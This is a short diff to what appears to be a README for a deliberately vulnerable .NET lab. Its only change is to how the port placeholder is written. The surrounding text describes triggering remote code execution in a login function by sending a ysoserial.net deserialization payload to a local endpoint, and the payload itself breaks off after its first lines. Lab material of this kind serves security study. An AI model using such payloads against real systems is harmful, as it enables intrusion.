@@ -6,7 +6,7 @@
 * Open it with Microsoft VS
 * Run
 # 1. Trigger RCE in login function
-* Send this payload (create by ysoserial.net) to localhost:<port>//Account/Login:
+* Send this payload (create by ysoserial.net) to localhost:[port]//Account/Login:
   ```
   {
     "username": {
